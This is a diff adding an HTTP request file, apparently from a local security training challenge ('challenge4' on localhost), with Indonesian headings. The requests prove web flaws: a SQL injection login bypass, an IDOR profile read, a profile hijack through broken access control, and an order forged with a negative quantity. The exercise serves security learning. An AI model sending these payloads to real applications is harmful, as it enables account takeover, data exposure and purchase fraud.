@@ -1,0 +1,20 @@
+### Bug 1: Buktikan SQL Injection (Bypass Login)
+POST http://localhost:10/challenge4/login.php
+Content-Type: application/x-www-form-urlencoded
+
+email=bebasaja&password=' OR '1'='1
+
+### Bug 4: Buktikan IDOR (Mengintip Data Orang Lain)
+GET http://localhost:10/challenge4/profile.php?id=2
+
+### Bug 5: Buktikan Broken Access Control (Bajak Profil)
+POST http://localhost:10/challenge4/update_profile.php
+Content-Type: application/x-www-form-urlencoded
+
+id=2&name=HackedByAlif&email=pwned@hacker.com
+
+### Bug 7 & 9: Buktikan Order Forgery & Logic Error
+POST http://localhost:10/challenge4/order.php
+Content-Type: application/x-www-form-urlencoded
+
+user_id=2&product_id=1&qty=-50
